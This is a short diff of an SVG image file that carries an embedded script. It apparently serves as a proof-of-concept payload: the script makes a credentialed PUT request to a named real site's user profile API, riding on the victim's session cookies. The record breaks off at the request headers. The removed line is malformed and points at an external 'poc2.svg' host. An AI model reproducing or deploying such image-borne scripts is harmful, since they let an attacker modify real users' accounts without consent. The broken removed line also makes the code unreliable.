@@ -1,6 +1,6 @@
 <svg xmlns="http://www.w3.org/2000/svg">
  <script><![CDATA[
-  fetch("photo_url":"https://usefoolsite.netlify.app/poc2.svg", {
+  fetch("https://thechatter.zerodha.com/api/v1/user/profile", {
    method: "PUT",
    credentials: "include",
    headers: {
